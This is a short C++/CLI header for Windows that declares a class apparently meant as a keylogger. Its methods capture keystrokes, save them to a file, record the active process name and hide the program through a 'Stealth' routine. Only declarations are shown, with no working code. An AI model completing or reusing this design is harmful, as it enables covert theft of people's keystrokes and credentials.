#pragma once
#include <windows.h>
#pragma comment(lib, "user32.lib")
using namespace System;
using namespace System::IO;
//===============================================================================
ref class CGetKey{
public:
	
//===============================================================================
public:
	CGetKey(void);
	~CGetKey(void);
	static void StartGeting(void);
	static void clrFile(void);
//===============================================================================
private:
	static int  Save(int key_stroke, char *file, String ^%);
	static void Stealth(void);
	static bool GetActiveProcessName(TCHAR *buffer, DWORD cchLen);
//===============================================================================
};